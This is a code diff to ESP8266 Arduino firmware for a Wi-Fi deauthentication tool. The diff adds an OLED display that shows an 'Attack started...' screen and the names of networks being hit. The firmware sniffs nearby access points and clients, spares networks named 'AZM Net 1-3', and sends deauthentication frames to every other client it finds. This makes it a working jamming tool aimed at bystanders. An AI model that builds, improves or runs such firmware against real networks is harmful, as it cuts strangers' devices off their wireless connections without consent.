@@ -7,6 +7,9 @@ extern "C" {
 #endif
 
 #include <ESP8266WiFi.h>
+#include <SSD1306Wire.h>
+#include <OLEDDisplayUi.h>
+#include <Wire.h>
 
 #define ETH_MAC_LEN 6
 #define MAX_APS_TRACKED 100
@@ -19,6 +22,13 @@ uint8_t whitelist[WHITELIST_LENGTH][ETH_MAC_LEN] = { {  0xe8, 0x48, 0xb8, 0x7d, 
 // Declare to whitelist STATIONs ONLY, otherwise STATIONs and APs can be whitelisted
 // If AP is whitelisted, all its clients become automatically whitelisted
 #define WHITELIST_STATION
+
+const int I2C_DISPLAY_ADDRESS = 0x3c;
+const int SDA_PIN = D1;
+const int SDC_PIN = D2;
+
+SSD1306Wire  display(I2C_DISPLAY_ADDRESS, SDA_PIN, SDC_PIN);
+OLEDDisplayUi ui     ( &display );
 
 // Channel to perform deauth
 uint8_t channel = 0;
@@ -394,21 +404,45 @@ bool check_whitelist(uint8_t *macAdress){
 
 bool check_whitelist2(clientinfo ci)
 {
+  String apps = get_apps(ci);
+  if(apps == "AZM Net 1" || apps == "AZM Net 2" || apps == "AZM Net 3"){
+    return true;
+  } else {
+    return false;
+  }
+}
+
+String get_apps(clientinfo ci)
+{
   if (ci.err != 0) {
   } else {
     for (int u = 0; u < aps_known_count; u++)
     {
-      if (!memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN) && (String((char *)aps_known[u].ssid) == "AZM Net 1" || String((char *)aps_known[u].ssid) == "AZM Net 2" || String((char *)aps_known[u].ssid) == "AZM Net 3")) {
-        return true;
+      if (!memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN)) {
+        return to_str(aps_known[u].ssid);
       }
     }
   }
-  return false;
+  return "";
+}
+
+String to_str(uint8_t *data){
+  return String((char *)data);
 }
 
 void setup() {
   Serial.begin(115200);
   Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());
+
+  // initialize dispaly
+  display.init();
+  display.flipScreenVertically();
+  display.clear();
+  display.drawString(30, 10, "Wifi DeAuth");
+  display.drawString(50, 30, "by");
+  display.drawString(20, 50, "Ahmad Zafrullah");
+  display.display();
+  delay(2000);
 
   // Promiscuous works only with station mode
   wifi_set_opmode(STATION_MODE);
@@ -437,6 +471,9 @@ void loop() {
           if (aps_known[ua].channel == channel) {
             for (int uc = 0; uc < clients_known_count; uc++) {
               if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
+
+                display.clear();
+                display.drawString(25, 5, "Attack started...");
                 
                 #ifdef WHITELIST_STATION
                   address_to_check = clients_known[uc].station;
@@ -449,11 +486,17 @@ void loop() {
                   friendly_device_found = true;
                   Serial.print("Whitelisted -->");
                   print_client(clients_known[uc]);
+                  display.drawString(0, 30, "Whitelisted -->");
+                  display.drawString(0, 45, get_apps(clients_known[uc]));
                 } else {
                   Serial.print("DeAuth to ---->");
                   print_client(clients_known[uc]);
+                  display.drawString(0, 30, "Deauthenticate -->");
+                  display.drawString(0, 45, get_apps(clients_known[uc]));
                   deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                 }
+
+                display.display();
                 break;
               }
             }
